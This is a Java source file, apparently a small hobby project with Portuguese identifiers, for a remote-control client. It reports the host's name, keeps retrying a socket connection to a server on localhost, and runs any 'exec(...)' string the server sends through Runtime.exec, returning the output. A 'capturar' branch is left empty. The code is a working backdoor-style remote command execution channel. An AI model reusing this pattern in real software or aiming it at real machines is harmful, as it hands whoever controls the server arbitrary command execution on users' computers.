package br.com.enviador.controller;

import java.awt.EventQueue;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

import javax.swing.JFrame;

import org.omg.CORBA.portable.InputStream;

import br.com.enviador.model.Cliente;

public class ClienteController {


	private Cliente cliente; //s
	
	public void nomeDaMainaqua(){
		this.cliente = new Cliente();
		
		String nome = "";  
		try {
		     nome = InetAddress.getLocalHost().getHostName();
		      
	    } catch (UnknownHostException e) {
		      e.printStackTrace();
	    }
		this.cliente.setNome(nome);
		
		
	}
	public void tentandoConexao(){
		
		Thread tentandoConexao = new Thread(new Runnable() {
			
			@Override
			public void run() {
				while(true){
					int tentativa = 0;
					System.out.println("Tentativa "+tentativa);
					
					try {
						Socket conexao = new Socket("localhost", 37389);
						processandoConexao(conexao);
						break;
					} catch (UnknownHostException e) {
						System.out.println("Servidor Indisponivel");
						
					} catch (IOException e) {
						System.out.println("Erro de IO");
						
					}			
					
					
					tentativa++;
					
					try {
						Thread.sleep(2000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					
				}
			}
		});
		
		tentandoConexao.start();
		
		
		
		
	}
	public void processandoConexao(final Socket conexao){
		this.cliente.setConexao(conexao);
		Thread processando = new Thread(new Runnable() {
			
			@Override
			public void run() {
				ObjectOutputStream saida;
				ObjectInputStream entrada;
				try {
					saida = new ObjectOutputStream(conexao.getOutputStream());
					saida.flush();
					saida.writeObject("setNome("+cliente.getNome()+")");
					saida.flush();
					
					entrada = new ObjectInputStream(conexao.getInputStream());
					
					cliente.setSaida(saida);
					cliente.setEntrada(entrada);
					
					while(true){
						String mensagem = (String) entrada.readObject();
						processandoMensagem(mensagem);
					}
					
					
				} catch (IOException | ClassNotFoundException e) {
					System.out.println("Eror de Io ");
				}
				
				
				
			}
		});
		processando.start();
	}
	public void processandoMensagem(final String mensagem){
		Thread processando = new Thread(new Runnable() {
			public void run() {
			
				System.out.println("Servidor disse: "+mensagem);
				if(mensagem.contains("abreJanelinha")){
					EventQueue.invokeLater(new Runnable() {
						public void run() {
							try {
								JFrame frame = new JFrame();
								frame.setSize(300, 300);
								frame.setVisible(true);
							} catch (Exception e) {
								e.printStackTrace();
							}
						}
					});
				}
				else if(mensagem.contains("capturar")){
					
					
					
				}
				else if(mensagem.contains("exec")){
					
					String cmdString = mensagem.substring("exec(".length(), mensagem.length() - 1);
					
					try
				      {
				         Runtime rt = Runtime.getRuntime();
				         

				         System.out.println(cmdString);
				         Process pr = rt.exec(cmdString);
				         BufferedReader input = new BufferedReader(new InputStreamReader(
				                                                   pr.getInputStream()));

				         String line = null;
				         String linhas = "";

				         while ((line = input.readLine()) != null)
				         {
				        	 linhas += line;
				         }

				         int exitVal = pr.waitFor();
				         linhas += "Erro:  " + exitVal;
				         cliente.getSaida().flush();
				         cliente.getSaida().writeObject(linhas);
				         
				         

				      }
				      catch (Exception e)
				      {
				         System.out.println(e.toString());
				         e.printStackTrace();
				      }
			            
			        
					
					
				}
				
			}
		});
		processando.start();
	}

	
}
